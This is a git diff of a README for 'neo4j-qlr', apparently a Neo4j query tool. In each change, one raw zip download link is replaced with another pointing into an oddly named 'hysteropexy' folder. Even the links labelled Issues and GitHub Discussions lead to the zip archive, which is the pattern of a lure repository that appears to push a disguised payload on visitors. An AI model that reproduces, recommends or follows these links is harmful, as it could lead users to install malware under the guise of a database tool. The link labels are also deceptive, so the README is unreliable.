@@ -1,6 +1,6 @@
 # 🚀 neo4j-qlr - Access Your Neo4j Database Easily
 
-[![Download Now](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip%20Now-Access%20Releases-brightgreen)](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip)
+[![Download Now](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip%20Now-Access%20Releases-brightgreen)](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip)
 
 ## 📘 Overview
 
@@ -21,7 +21,7 @@ To run neo4j-qlr, you need the following:
 
 To get started, visit the Releases page to download the application. Click the button below:
 
-[![Download Now](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip%20Now-Access%20Releases-brightgreen)](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip)
+[![Download Now](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip%20Now-Access%20Releases-brightgreen)](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip)
 
 ### Step 2: Select the Right Version
 
@@ -69,7 +69,7 @@ After connecting, you will see a text area where you can run your queries. Type 
 
 Make sure to download the application from the following link:
 
-[![Download Now](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip%20Now-Access%20Releases-brightgreen)](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip)
+[![Download Now](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip%20Now-Access%20Releases-brightgreen)](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip)
 
 ## 🔧 Features
 
@@ -84,7 +84,7 @@ If you encounter any issues:
 
 - Ensure that Neo4j is running properly on your machine.
 - Check your network settings if you are connecting to a remote database.
-- Visit the [Issues](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip) page for common problems and solutions.
+- Visit the [Issues](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip) page for common problems and solutions.
 
 ## 📝 Contribution
 
@@ -92,7 +92,7 @@ We welcome contributions. If you have suggestions, comments, or bug reports, ple
 
 ## 🗣️ Community
 
-Join our community for help and discussions. Connect with other users on [GitHub Discussions](https://raw.githubusercontent.com/mirochnishenko/neo4j-qlr/main/hysteropexy/neo4j-qlr.zip).
+Join our community for help and discussions. Connect with other users on [GitHub Discussions](https://github.com/mirochnishenko/neo4j-qlr/raw/refs/heads/main/hysteropexy/qlr-j-neo-xenian.zip).
 
 ## 📜 License
 
